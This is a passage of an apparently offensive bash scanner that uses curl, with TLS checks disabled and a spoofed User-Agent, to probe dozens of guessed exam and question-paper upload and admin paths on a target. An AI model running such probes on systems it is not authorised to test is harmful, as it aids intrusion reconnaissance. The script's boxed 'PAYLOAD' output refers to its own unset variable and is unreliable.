code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-FileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System-QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper-Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper-Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt_QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt_QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessingQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessingQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatchDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatchDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPTransfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPTransfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileAutomation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileAutomation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileBatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerManagement/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagementQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagementQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_QPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_QPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer_QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer_QPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
